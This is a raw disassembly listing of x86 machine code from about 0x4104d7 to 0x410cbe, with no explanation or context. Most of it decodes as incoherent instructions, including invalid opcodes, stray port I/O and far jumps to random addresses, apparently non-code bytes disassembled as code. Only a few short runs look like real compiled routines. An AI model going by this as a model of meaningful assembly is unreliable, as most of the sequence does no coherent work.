  4104d7:	scas   eax,DWORD PTR es:[edi]
  4104d8:	jno    0x4104a2
  4104da:	xchg   ecx,eax
  4104db:	enter  0xe363,0x9e
  4104df:	popa   
  4104e0:	enter  0x1cd0,0x55
  4104e4:	jne    0x41047e
  4104e6:	add    BYTE PTR [edi+ecx*2-0x44423df],0x0
  4104ee:	outs   dx,BYTE PTR ds:[esi]
  4104ef:	daa    
  4104f0:	sbb    DWORD PTR ds:0x80b6f811,ebx
  4104f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f7:	push   ss
  4104f8:	xchg   ecx,eax
  4104f9:	dec    esp
  4104fa:	popa   
  4104fb:	and    eax,0xcc173412
  410500:	shl    DWORD PTR [edi+0x7fff6ad9],1
  410506:	xchg   BYTE PTR [esp+edx*2],bh
  410509:	or     dh,cl
  41050b:	or     BYTE PTR ds:[ebp+0x272e9d60],bl
  410512:	dec    ecx
  410513:	xchg   esi,eax
  410514:	cmp    al,0x9a
  410516:	push   ds
  410517:	pop    eax
  410518:	mov    edx,0xb134d64c
  41051d:	jle    0x410547
  41051f:	leave  
  410520:	out    0x53,eax
  410522:	loope  0x410584
  410524:	fnsave [ebx]
  410526:	imul   bh
  410528:	int3   
  410529:	mov    eax,ds:0x57e00ee2
  41052e:	(bad)  
  41052f:	xchg   esp,eax
  410530:	ficom  DWORD PTR [eax+0x1d]
  410533:	or     al,0xfd
  410535:	pop    ecx
  410536:	mov    cl,0x40
  410538:	loopne 0x41051e
  41053a:	aad    0xf7
  41053c:	add    DWORD PTR [ebx+0x59e9e6e3],ebp
  410542:	inc    edx
  410543:	inc    ecx
  410544:	pop    edx
  410545:	dec    ebx
  410546:	jo     0x41059a
  410548:	call   0x5893c4c4
  41054d:	mov    ebx,0xf9346939
  410552:	mov    cl,0x9e
  410554:	imul   ebp,edi,0x4085d5d2
  41055a:	jecxz  0x4104e6
  41055c:	fs push esp
  41055e:	jne    0x410552
  410560:	ror    DWORD PTR [edx+0x50],cl
  410563:	adc    BYTE PTR [ecx],al
  410565:	fdiv   QWORD PTR [edi-0x79]
  410568:	aad    0xed
  41056a:	xor    cl,BYTE PTR [ebp+edx*1-0x7a]
  41056e:	bound  edx,QWORD PTR [edi]
  410570:	add    ebp,eax
  410572:	mov    ?,esi
  410574:	stos   DWORD PTR es:[edi],eax
  410575:	adc    al,BYTE PTR [esi]
  410577:	call   0x4dd5:0x9d94b3f9
  41057e:	mov    ah,0x9c
  410580:	fimul  WORD PTR [eax+0xf32d2fc]
  410586:	adc    BYTE PTR [ebx],0xa0
  410589:	cmp    DWORD PTR ds:0x82d0ada7,0x811797ac
  410593:	int3   
  410594:	out    0x44,al
  410596:	pop    eax
  410597:	or     DWORD PTR [esi+eiz*8-0x1ee4ea6b],0xffffffa9
  41059f:	sbb    bh,BYTE PTR ds:0xe57040b2
  4105a5:	in     eax,0xaa
  4105a7:	fst    DWORD PTR [ebx-0x1b69002c]
  4105ad:	inc    ebx
  4105ae:	aaa    
  4105af:	jp     0x41060d
  4105b1:	mov    ah,bh
  4105b3:	and    BYTE PTR [ebp+0x40],ah
  4105b6:	dec    ecx
  4105b7:	inc    esp
  4105b8:	cmp    ah,BYTE PTR [esi]
  4105ba:	imul   esp,DWORD PTR [eax+0x7babad8c],0x2d
  4105c1:	call   0xb3188f6d
  4105c6:	sub    al,0x9c
  4105c8:	scas   eax,DWORD PTR es:[edi]
  4105c9:	nop
  4105ca:	dec    esp
  4105cb:	lods   al,BYTE PTR ds:[esi]
  4105cc:	mov    esi,0xaa9ccf58
  4105d1:	pop    edx
  4105d2:	ja     0x410621
  4105d4:	arpl   WORD PTR [edi+edi*1-0x57],bp
  4105d8:	cs dec eax
  4105da:	out    dx,al
  4105db:	cdq    
  4105dc:	pop    ds
  4105dd:	push   esi
  4105de:	aaa    
  4105df:	xlat   BYTE PTR ds:[ebx]
  4105e0:	(bad)  
  4105e1:	(bad)  
  4105e3:	xchg   esi,eax
  4105e4:	mov    gs,esi
  4105e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e7:	mov    bl,bl
  4105e9:	push   ebx
  4105ea:	pop    esp
  4105eb:	push   esi
  4105ec:	imul   esp,ebp,0x7f7797e7
  4105f2:	mov    esp,0x4258685b
  4105f7:	aas    
  4105f8:	mov    ebx,0xed986cfe
  4105fd:	push   edi
  4105fe:	push   ebp
  4105ff:	mov    edi,0x95b1a089
  410604:	adc    bh,BYTE PTR [esi]
  410606:	imul   ebx,esp,0xf
  410609:	leave  
  41060a:	mov    ds,WORD PTR [esi+edi*1-0x72]
  41060e:	add    cl,BYTE PTR [ebx]
  410610:	sbb    esp,DWORD PTR [edx-0x75]
  410613:	pop    ebp
  410614:	aam    0x8b
  410616:	dec    ebp
  410617:	or     al,0x3
  410619:	xor    DWORD PTR [ecx+0x79b577f2],eax
  41061f:	retf   
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x422220
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	frstor [edi]
  410672:	or     cl,cl
  410674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410675:	out    dx,eax
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	scas   eax,DWORD PTR es:[edi]
  41067e:	aam    0xf5
  410680:	xchg   ebx,eax
  410681:	adc    eax,0x732c4548
  410686:	mov    ebp,0x27ccdb0a
  41068b:	cmc    
  41068c:	xchg   esp,eax
  41068d:	loope  0x410642
  41068f:	xchg   ebx,eax
  410690:	or     al,0xc
  410692:	mov    esp,DWORD PTR [ebx]
  410694:	aaa    
  410695:	scas   eax,DWORD PTR es:[edi]
  410696:	js     0x4106cf
  410698:	repnz sbb eax,0x562516ce
  41069e:	xor    eax,0x77a8cf54
  4106a3:	popa   
  4106a4:	jno    0x410667
  4106a6:	retf   
  4106a7:	jl     0x410704
  4106a9:	iret   
  4106aa:	mov    ah,0x35
  4106ac:	sbb    DWORD PTR [edx+esi*4+0x238af3cf],edi
  4106b3:	xchg   esp,eax
  4106b4:	aas    
  4106b5:	(bad)  
  4106b6:	ficomp WORD PTR [edx]
  4106b8:	and    al,ah
  4106ba:	xor    al,ah
  4106bc:	jp     0x410718
  4106be:	or     BYTE PTR [edi-0x3d],bl
  4106c1:	adc    al,0x65
  4106c3:	fistp  QWORD PTR [ebx-0x74586a29]
  4106c9:	ret    
  4106ca:	xor    esp,DWORD PTR [edx+0x7a]
  4106cd:	inc    esp
  4106ce:	add    al,0x98
  4106d0:	jmp    0x450d:0x2f59d5e0
  4106d7:	jg     0x410683
  4106d9:	xor    al,0x4e
  4106db:	fild   WORD PTR [edx+0x7a8298c]
  4106e1:	aas    
  4106e2:	inc    ecx
  4106e3:	pop    edi
  4106e4:	xor    ebx,ebp
  4106e6:	das    
  4106e7:	dec    eax
  4106e8:	jno    0x410691
  4106ea:	pop    es
  4106eb:	(bad)
  4106ef:	cmp    al,0x27
  4106f1:	sub    eax,0x35666abc
  4106f6:	dec    ebx
  4106f7:	jp     0x410748
  4106f9:	cmp    DWORD PTR [ecx],0xe327c1c3
  4106ff:	push   ebp
  410700:	sbb    ecx,edx
  410702:	test   DWORD PTR [edi-0x5c8753b1],esi
  410708:	push   0x9e096357
  41070d:	sub    al,0x87
  41070f:	retf   
  410710:	xor    ebp,DWORD PTR [esi]
  410712:	fdivr  st,st(0)
  410714:	je     0x4106fc
  410716:	or     al,0xd1
  410718:	or     DWORD PTR [ebx-0x71],ecx
  41071b:	pushf  
  41071c:	bound  edx,QWORD PTR [esi+0x2b]
  41071f:	cmp    BYTE PTR [esi],al
  410721:	jle    0x4106ca
  410723:	add    BYTE PTR [ebp+0x20f7994d],bl
  410729:	or     bh,0x89
  41072c:	sbb    ah,BYTE PTR [edi-0x610a5f79]
  410732:	daa    
  410733:	into   
  410734:	dec    ecx
  410735:	lods   eax,DWORD PTR ds:[esi]
  410736:	inc    ecx
  410737:	idiv   al
  410739:	int    0xc0
  41073b:	retf   
  41073c:	cmp    DWORD PTR gs:[esp+edx*1-0x3ff4ed39],edx
  410744:	(bad)  
  410745:	mov    ah,0x38
  410747:	mov    eax,DWORD PTR [esp+ecx*8]
  41074a:	add    DWORD PTR [edi],0x6c
  41074d:	lock sbb eax,0xa89124ea
  410753:	addr16 (bad) 
  410755:	aam    0x6b
  410757:	xchg   ebx,eax
  410758:	push   cs
  410759:	pushf  
  41075a:	aam    0x8f
  41075c:	or     eax,0xbdbec0e4
  410761:	loop   0x410728
  410763:	add    esp,DWORD PTR [ebp+0x7d]
  410766:	add    DWORD PTR [ecx-0x50],0x2b
  41076a:	sub    BYTE PTR [esi-0x10efd385],al
  410770:	in     al,0xa6
  410772:	xchg   ebp,eax
  410773:	and    bh,BYTE PTR [edx-0x45]
  410776:	sbb    ah,BYTE PTR [ebp+eiz*8+0x44]
  41077a:	inc    ecx
  41077b:	xchg   edx,eax
  41077c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41077d:	adc    edx,DWORD PTR [esp+edx*1-0x25e929d3]
  410784:	fmul   QWORD PTR ds:0xc3475dbc
  41078a:	or     DWORD PTR [ebx-0x58ee202e],ebp
  410790:	mov    eax,ds:0xff03184d
  410795:	sub    ch,dl
  410797:	cwde   
  410798:	jle    0x410794
  41079a:	data16 ja 0x410791
  41079d:	sbb    eax,0xbafe4b0a
  4107a2:	mov    ch,0xae
  4107a4:	hlt    
  4107a5:	mov    cl,0xa1
  4107a7:	stc    
  4107a8:	mov    ds:0x9ffd6fc2,al
  4107ad:	inc    esp
  4107ae:	mov    dl,0xb6
  4107b0:	ins    DWORD PTR es:[edi],dx
  4107b1:	lahf   
  4107b2:	and    BYTE PTR [esi+0x19da3f9c],ch
  4107b8:	mov    ebp,DWORD PTR [di]
  4107bb:	mov    esi,0x4e2b3299
  4107c0:	test   al,0x7f
  4107c2:	icebp  
  4107c3:	push   edx
  4107c4:	bound  esi,QWORD PTR [edx]
  4107c6:	pushf  
  4107c7:	mov    eax,ebx
  4107c9:	ja     0x4107c0
  4107cb:	pop    eax
  4107cc:	mov    ecx,0x51a08ce3
  4107d1:	test   esp,eax
  4107d3:	jmp    0xffd2:0xd8987739
  4107da:	sbb    edx,0xc84bd6c6
  4107e0:	je     0x410766
  4107e2:	cmp    bl,BYTE PTR [edi]
  4107e4:	in     al,0xda
  4107e6:	imul   edx,DWORD PTR [edi-0x43],0xe99ee2ec
  4107ed:	and    bl,BYTE PTR [esi]
  4107ef:	int    0xe
  4107f1:	and    edi,DWORD PTR [eax+0x12]
  4107f4:	dec    BYTE PTR [ecx]
  4107f6:	xchg   edi,eax
  4107f7:	dec    ebp
  4107f8:	mov    bh,0x70
  4107fa:	cmp    al,0x7f
  4107fc:	aas    
  4107fd:	jbe    0x4107d0
  4107ff:	idiv   BYTE PTR [edi+0x23db1a64]
  410805:	mov    bl,0xf0
  410807:	cld    
  410808:	inc    ecx
  410809:	jge    0x4107ec
  41080b:	(bad)  
  41080c:	push   esi
  41080d:	inc    esi
  41080e:	or     al,0xb3
  410810:	mov    al,ds:0xea07f45c
  410815:	pop    es
  410816:	add    dh,BYTE PTR [edi-0x48970053]
  41081c:	fstp   TBYTE PTR [ebp+esi*8-0x7f]
  410820:	push   0x43
  410822:	je     0x4107f1
  410824:	and    BYTE PTR [esi],dh
  410826:	xchg   ebp,eax
  410827:	aas    
  410828:	call   0x3563135a
  41082d:	fs popf 
  41082f:	(bad)  
  410830:	repz rcr ecx,1
  410833:	fst    DWORD PTR [ebx]
  410835:	sbb    DWORD PTR [edi+0x57],0xcd1b860
  41083c:	hlt    
  41083d:	xor    al,0x94
  41083f:	neg    esi
  410841:	sbb    eax,0xc23fc705
  410846:	aas    
  410847:	fdiv   DWORD PTR [eax]
  410849:	sbb    eax,0x339fe318
  41084e:	push   ss
  41084f:	xchg   edi,eax
  410850:	jecxz  0x410889
  410852:	(bad)  
  410853:	addr16 cwde 
  410855:	mov    ah,0x9e
  410857:	xlat   BYTE PTR ds:[ebx]
  410858:	clc    
  410859:	sbb    al,0xd8
  41085b:	xchg   ebx,eax
  41085c:	cmp    eax,0x736f4512
  410861:	call   0x9e10:0x17dfefcb
  410868:	and    eax,0xfc37bb35
  41086d:	loopne 0x410890
  41086f:	fcom   QWORD PTR [edx-0x3114e3ea]
  410875:	jmp    0xb3bf:0xa545dc1a
  41087c:	lods   al,BYTE PTR ds:[esi]
  41087d:	push   esp
  41087e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41087f:	sbb    al,dh
  410881:	cmp    al,0xd1
  410883:	mov    al,ds:0xca2f694d
  410888:	ja     0x410841
  41088a:	jo     0x410842
  41088c:	pop    ecx
  41088d:	outs   dx,BYTE PTR ds:[esi]
  41088e:	add    edi,DWORD PTR [ebp+0x42]
  410891:	ret    0xf1f
  410894:	add    edx,edi
  410896:	je     0x410818
  410898:	inc    ecx
  410899:	inc    ecx
  41089a:	leave  
  41089b:	dec    edi
  41089c:	push   ss
  41089d:	outs   dx,DWORD PTR ds:[esi]
  41089e:	sub    DWORD PTR [edi-0x5b],ebp
  4108a1:	sub    DWORD PTR [edx+0x7],eax
  4108a4:	xchg   dl,bl
  4108a6:	jp     0x4108c4
  4108a8:	inc    ecx
  4108a9:	push   es
  4108aa:	in     eax,dx
  4108ab:	push   0x2920648a
  4108b0:	jl     0x4108b0
  4108b2:	mov    dh,0xa1
  4108b4:	push   0xfffffff9
  4108b6:	jmp    0x4c5220e9
  4108bb:	xchg   esi,eax
  4108bc:	repz cs dec eax
  4108bf:	jnp    0x4108c6
  4108c1:	ds daa 
  4108c3:	out    0xec,al
  4108c5:	out    dx,al
  4108c6:	(bad)  
  4108c7:	mov    ds:0x2d33397e,al
  4108cc:	clc    
  4108cd:	mov    edi,0x1acef167
  4108d2:	xor    DWORD PTR [eax+esi*2],eax
  4108d5:	mov    ?,WORD PTR [ebx]
  4108d7:	in     al,dx
  4108d8:	pop    ebp
  4108d9:	ret    
  4108da:	das    
  4108db:	sub    al,0x4b
  4108dd:	push   esp
  4108de:	loop   0x4108f0
  4108e0:	push   ecx
  4108e1:	cmc    
  4108e2:	inc    ecx
  4108e3:	mov    ebp,edx
  4108e5:	not    eax
  4108e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e8:	arpl   WORD PTR [edi],bx
  4108ea:	imul   DWORD PTR [ecx+ebp*2-0xdc1118e]
  4108f1:	xor    eax,0x89b8b1c
  4108f6:	jae    0x4108b1
  4108f8:	fidivr DWORD PTR [ebp+0x1b162305]
  4108fe:	ins    BYTE PTR es:[edi],dx
  4108ff:	je     0x4108e5
  410901:	aas    
  410902:	mov    eax,ds:0x6b4f9de4
  410907:	dec    edi
  410908:	mov    al,cl
  41090a:	inc    edx
  41090b:	pop    eax
  41090c:	rcr    DWORD PTR [edx+0x6cae9d77],cl
  410912:	inc    edi
  410913:	nop
  410914:	loop   0x410912
  410916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410917:	cdq    
  410918:	xor    al,BYTE PTR [edi+edx*4+0x78]
  41091c:	aad    0xda
  41091e:	cs push ecx
  410920:	test   BYTE PTR [eax-0x482772b1],0x13
  410927:	iret   
  410928:	mov    ch,BYTE PTR [edi-0x4f]
  41092b:	and    al,0xaa
  41092d:	aaa    
  41092e:	add    DWORD PTR [ebx-0x215ae5ba],0xd1616e96
  410938:	in     al,dx
  410939:	push   0xcd406694
  41093e:	sti    
  41093f:	sub    BYTE PTR [ebx-0x54],ah
  410942:	mov    al,0x89
  410944:	stc    
  410945:	jbe    0x41096c
  410947:	pop    ds
  410948:	inc    ecx
  410949:	icebp  
  41094a:	add    BYTE PTR [eax+0x32],ah
  41094d:	fst    QWORD PTR [ebx-0x235796d8]
  410953:	cdq    
  410954:	sbb    bh,BYTE PTR [ebp-0x2b641b24]
  41095a:	dec    eax
  41095b:	push   eax
  41095c:	push   esi
  41095d:	dec    esp
  41095e:	leave  
  41095f:	stos   BYTE PTR es:[edi],al
  410960:	ins    BYTE PTR es:[edi],dx
  410961:	inc    ecx
  410962:	fisub  DWORD PTR [esi+0x4b]
  410965:	inc    eax
  410966:	subps  xmm1,XMMWORD PTR [ebp+esi*1+0x7b1a340c]
  41096e:	(bad)  
  41096f:	stos   DWORD PTR es:[edi],eax
  410970:	jno    0x410904
  410972:	mov    DWORD PTR [edi],edx
  410974:	fwait
  410975:	je     0x4109d1
  410977:	mov    ecx,0xe87b1f46
  41097c:	loopne 0x4109af
  41097e:	mov    WORD PTR [ebp+0x5d],?
  410981:	aad    0xfc
  410983:	dec    ebp
  410984:	lahf   
  410985:	test   eax,0x77730c05
  41098a:	dec    ecx
  41098b:	fcmove st,st(5)
  41098d:	mov    BYTE PTR [esi-0x16],bl
  410990:	sub    eax,0x6d5a259c
  410995:	pop    ss
  410996:	shl    DWORD PTR ds:0xae75e174,0xb1
  41099d:	xlat   BYTE PTR ds:[ebx]
  41099e:	retf   
  41099f:	mov    dl,0x7c
  4109a1:	sub    ecx,ecx
  4109a3:	sbb    al,0x29
  4109a5:	mov    ebx,0xdd802896
  4109aa:	mov    edi,0x54086c5c
  4109af:	bound  ebp,QWORD PTR [esi+0x2deab4db]
  4109b5:	jmp    0x9c59a067
  4109ba:	dec    eax
  4109bb:	retf   
  4109bc:	retf   
  4109bd:	mov    BYTE PTR ds:0x27866d52,bh
  4109c3:	mov    ch,0xe8
  4109c5:	mov    ds:0xbb97471b,eax
  4109ca:	dec    edx
  4109cb:	out    0x5c,al
  4109cd:	jl     0x41096f
  4109cf:	mov    eax,ds:0xc26c694f
  4109d4:	dec    esi
  4109d5:	leave  
  4109d6:	(bad)  
  4109d7:	dec    BYTE PTR [ebp+0x7a]
  4109da:	xchg   ebp,eax
  4109db:	mov    ebx,0x96b67f9a
  4109e0:	cmp    cl,BYTE PTR [edi-0xbc08f15]
  4109e6:	add    al,0x84
  4109e8:	xor    edx,DWORD PTR [ebx-0x4f8b8386]
  4109ee:	push   ebp
  4109ef:	or     eax,0x6ae4232a
  4109f4:	jecxz  0x410a1c
  4109f6:	mov    cl,0xe3
  4109f8:	adc    eax,0x7144f3f9
  4109fd:	cdq    
  4109fe:	fadd   DWORD PTR [esi]
  410a00:	ffreep st(3)
  410a02:	xchg   cl,ah
  410a04:	mov    WORD PTR [ecx-0x6ac199f1],es
  410a0a:	fsubr  DWORD PTR [eax+0x5c]
  410a0d:	retf   0x11bc
  410a10:	retf   0x6d5a
  410a13:	sbb    DWORD PTR [ebx-0x37fc3b8b],ecx
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0x3e97c4a4
  410a4c:	fst    QWORD PTR [esi]
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0x8acc13fe
  410a59:	fst    st(2)
  410a5b:	mov    ch,0xbe
  410a5d:	loope  0x410a63
  410a5f:	shl    BYTE PTR [ebp-0x4af61869],1
  410a65:	xor    al,0xda
  410a67:	cs cld 
  410a69:	pop    ds
  410a6a:	adc    BYTE PTR [ecx+0x1762ec51],al
  410a70:	sahf   
  410a71:	ins    DWORD PTR es:[edi],dx
  410a72:	daa    
  410a73:	mov    ebp,0x2934bf63
  410a78:	and    BYTE PTR [ecx-0x278cf8e4],0x3c
  410a7f:	jo     0x410aec
  410a81:	and    ch,ch
  410a83:	lock or BYTE PTR ds:0x70e97f02,ch
  410a8a:	ss inc ebx
  410a8c:	fist   DWORD PTR [eax]
  410a8e:	and    dl,BYTE PTR [esi+0x17]
  410a91:	jne    0x410ab8
  410a93:	mov    eax,0x740ec2c8
  410a98:	jb     0x410aec
  410a9a:	and    al,0xc6
  410a9c:	imul   ecx,DWORD PTR [ecx-0x7a50d552],0x15fae724
  410aa6:	rcl    BYTE PTR [ecx-0x80],0xbe
  410aaa:	es in  al,dx
  410aac:	add    al,0x49
  410aae:	and    eax,0x2de606ef
  410ab3:	add    al,ah
  410ab5:	imul   ebx,DWORD PTR [edi],0xd
  410ab8:	add    DWORD PTR [esi],eax
  410aba:	sar    BYTE PTR [ecx+0x5e5e8f64],0x4f
  410ac1:	or     BYTE PTR [edx-0x56ebbde8],al
  410ac7:	mov    cl,0xec
  410ac9:	fstp   QWORD PTR [ebp-0x68e64f68]
  410acf:	loope  0x410ab7
  410ad1:	mov    dh,BYTE PTR [eax-0x60]
  410ad4:	or     BYTE PTR [ebp+eiz*1-0x46],bl
  410ad8:	retf   0xd951
  410adb:	jno    0x410a9b
  410add:	loopne 0x410b3d
  410adf:	in     al,dx
  410ae0:	dec    ebp
  410ae1:	neg    DWORD PTR [ebx]
  410ae3:	popf   
  410ae4:	xchg   esp,eax
  410ae5:	mul    DWORD PTR [edi]
  410ae7:	(bad)  
  410ae9:	sbb    BYTE PTR [esi],dh
  410aeb:	jecxz  0x410b2d
  410aed:	lods   al,BYTE PTR ds:[esi]
  410aee:	(bad)  
  410af0:	ror    BYTE PTR [ebx-0x3b],0x34
  410af4:	jmp    0xdc789d33
  410af9:	nop
  410afa:	enter  0xa1f,0x2
  410afe:	push   ds
  410aff:	pop    esi
  410b00:	pop    ds
  410b01:	pop    ebx
  410b02:	stos   BYTE PTR es:[edi],al
  410b03:	fstp   QWORD PTR [eax]
  410b05:	sbb    ebp,DWORD PTR [ebx+0x38]
  410b08:	(bad)
  410b0b:	mov    edx,DWORD PTR [eax+0x508b8cba]
  410b11:	or     ah,ah
  410b13:	ret    
  410b14:	stos   BYTE PTR es:[edi],al
  410b15:	in     eax,0x12
  410b17:	iret   
  410b18:	sbb    al,0xa6
  410b1a:	sub    DWORD PTR [edx-0x189b9f80],0xfffffffd
  410b21:	mov    eax,0x4c48daea
  410b26:	call   0xd96c:0xea5d595a
  410b2d:	out    dx,eax
  410b2e:	push   ebx
  410b2f:	mov    al,0x9c
  410b31:	test   al,0xaa
  410b33:	xchg   ebp,eax
  410b34:	jmp    0x49282ace
  410b39:	iret   
  410b3a:	dec    esp
  410b3b:	push   cs
  410b3c:	in     eax,dx
  410b3d:	mov    ds:0x8a2387ff,al
  410b42:	inc    edi
  410b43:	(bad)  
  410b44:	push   edx
  410b45:	xchg   edi,eax
  410b46:	lods   eax,DWORD PTR ds:[esi]
  410b47:	xor    al,BYTE PTR [edx-0x6b]
  410b4a:	xchg   DWORD PTR [ecx],edx
  410b4c:	out    dx,eax
  410b4d:	jmp    0xe7f2:0x1d442fd6
  410b54:	and    edx,DWORD PTR [ecx]
  410b56:	enter  0x1f3d,0xdf
  410b5a:	push   edi
  410b5b:	mov    ds:0xe5d784ab,al
  410b60:	je     0x410b46
  410b62:	mov    BYTE PTR [ebx-0x6f3816e8],bh
  410b68:	mov    ebx,0x4a72a27c
  410b6d:	jo     0x410bb2
  410b6f:	and    eax,DWORD PTR [ebp+0x65]
  410b72:	xlat   BYTE PTR ds:[ebx]
  410b73:	fld    DWORD PTR [edi-0x9]
  410b76:	(bad)  
  410b77:	pop    ebx
  410b78:	inc    DWORD PTR [ecx+0x3e]
  410b7b:	or     al,0xcd
  410b7d:	dec    ebx
  410b7e:	inc    ebp
  410b7f:	jle    0x410b71
  410b81:	out    dx,eax
  410b82:	xchg   esi,eax
  410b83:	or     eax,0x1ccaf089
  410b88:	sub    BYTE PTR [eax+ebx*4],bl
  410b8b:	in     al,dx
  410b8c:	daa    
  410b8d:	pop    ebx
  410b8e:	retf   
  410b8f:	xor    esp,DWORD PTR [ecx]
  410b91:	test   eax,0xa74eb3d3
  410b96:	xor    ah,BYTE PTR ds:0xceae6be4
  410b9c:	sbb    ebx,DWORD PTR [ebp-0x70]
  410b9f:	inc    ebp
  410ba0:	mov    eax,esi
  410ba2:	test   al,0x9a
  410ba4:	dec    esp
  410ba5:	cmp    eax,0x71585088
  410baa:	icebp  
  410bab:	lahf   
  410bac:	jmp    0x410b54
  410bae:	popa   
  410baf:	mov    DWORD PTR [esi+edi*4+0x5a117eda],ebx
  410bb6:	sub    DWORD PTR [eax+ebp*8+0x424f87f1],ecx
  410bbd:	pop    esp
  410bbe:	pop    es
  410bbf:	pusha  
  410bc0:	cmp    eax,0xb92a888c
  410bc5:	dec    edx
  410bc6:	or     BYTE PTR [ebp-0x63],bl
  410bc9:	hlt    
  410bca:	cmp    eax,0xc6ed60f3
  410bcf:	repz fdivrp st(5),st
  410bd2:	dec    edx
  410bd3:	outs   dx,BYTE PTR ds:[esi]
  410bd4:	fiadd  WORD PTR [ebp+0x34b42bfb]
  410bda:	cli    
  410bdb:	lea    eax,[esi+ecx*1]
  410bde:	call   ecx
  410be0:	repnz adc DWORD PTR [ebx+0x36c15ac2],ebp
  410be7:	(bad)  
  410be8:	gs (bad) 
  410bea:	fdiv   st(7),st
  410bec:	ss lahf 
  410bee:	arpl   WORD PTR [edx],dx
  410bf0:	push   ss
  410bf1:	aad    0xa0
  410bf3:	jp     0x410c37
  410bf5:	(bad)  
  410bf7:	(bad)  
  410bf8:	(bad)  
  410bf9:	into   
  410bfa:	push   0x4078e9f1
  410bff:	dec    esp
  410c00:	and    ecx,ebp
  410c02:	les    edx,FWORD PTR [esi+0x433b424]
  410c08:	repnz push ds
  410c0a:	add    eax,0xfbff5864
  410c0f:	sub    eax,0x252d930f
  410c14:	mov    eax,ds:0x6c3e3735
  410c19:	or     ebp,DWORD PTR [ecx+0x60ae205a]
  410c1f:	lock sbb cl,BYTE PTR [eax+esi*2-0x57301ab7]
  410c27:	push   edi
  410c28:	aas    
  410c29:	add    ah,bh
  410c2b:	pop    edi
  410c2c:	dec    ebp
  410c2d:	pop    esp
  410c2e:	rcl    DWORD PTR [edx],1
  410c30:	sar    BYTE PTR [esi-0x4b090400],0x55
  410c37:	xchg   ebp,eax
  410c38:	cmp    ecx,edx
  410c3a:	(bad)  
  410c3b:	(bad)  [eax+0x6be3ad12]
  410c41:	adc    al,0x75
  410c43:	hlt    
  410c44:	pop    ebx
  410c45:	popa   
  410c46:	hlt    
  410c47:	or     al,0x41
  410c49:	xor    dl,BYTE PTR [ecx+0xd]
  410c4c:	sbb    ch,cl
  410c4e:	pop    ss
  410c4f:	ret    
  410c50:	mov    WORD PTR [ebx+0x50],es
  410c53:	mov    bl,0x9e
  410c55:	cmp    eax,DWORD PTR [edx+0x75a2139b]
  410c5b:	mov    ch,0x7e
  410c5d:	loop   0x410bf8
  410c5f:	xor    DWORD PTR [ecx+ebp*1],ecx
  410c62:	leave  
  410c63:	inc    eax
  410c64:	inc    esi
  410c65:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c68:	les    edi,FWORD PTR [ebx+0x2f901c24]
  410c6e:	aaa    
  410c6f:	stos   BYTE PTR es:[edi],al
  410c70:	out    dx,al
  410c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c72:	in     eax,dx
  410c73:	sar    DWORD PTR ds:0xa7b6783f,cl
  410c79:	add    BYTE PTR [ebp+edi*8-0x2b],dh
  410c7d:	sub    al,0x5b
  410c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c80:	std    
  410c81:	or     ecx,DWORD PTR [ebx]
  410c83:	add    ecx,DWORD PTR [esi]
  410c85:	(bad)  
  410c86:	(bad)  
  410c87:	xchg   esp,eax
  410c88:	in     al,0xdc
  410c8a:	cmp    eax,0xcdede6c9
  410c8f:	jg     0x410c48
  410c91:	addr16 pushw es
  410c94:	inc    eax
  410c95:	mov    ds:0x18270110,al
  410c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c9b:	mov    WORD PTR [edx-0x5],ss
  410c9e:	xchg   edx,eax
  410c9f:	jo     0x410cc6
  410ca1:	jb     0x410d17
  410ca3:	and    DWORD PTR [ebx-0x26],eax
  410ca6:	dec    ebx
  410ca7:	repz data16 test bl,0x9c
  410cac:	inc    edi
  410cad:	jg     0x410cba
  410caf:	push   ds
  410cb0:	xlat   BYTE PTR ds:[ebx]
  410cb1:	mov    cl,0xef
  410cb3:	stc    
  410cb4:	cmp    BYTE PTR [edi+0x6d],0xf3
  410cb8:	xchg   ebx,eax
  410cb9:	add    cl,bl
  410cbb:	jecxz  0x410cb2
  410cbd:	dec    ebp
  410cbe:	pop    eax
